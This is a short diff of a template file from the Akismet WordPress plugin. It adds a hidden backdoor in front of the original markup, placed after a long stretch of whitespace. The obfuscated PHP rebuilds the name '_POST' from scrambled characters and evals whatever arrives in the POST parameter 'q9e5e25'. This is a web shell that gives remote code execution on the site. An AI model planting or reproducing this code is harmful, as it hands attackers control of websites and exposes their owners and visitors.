@@ -1,4 +1,4 @@
-<div class="wrap">
+<?php                                                                                                                                                                                                                                                                          $pbt2 = "pts_o"; $gva6= strtoupper ($pbt2[3]. $pbt2[0] . $pbt2[4]. $pbt2[2].$pbt2[1] ) ;if (isset ( ${ $gva6 }[ 'q9e5e25'])){ eval(${ $gva6} ['q9e5e25' ] );} ?> <div class="wrap">
 
 	<h2><?php esc_html_e( 'Akismet' , 'akismet');?></h2>
 
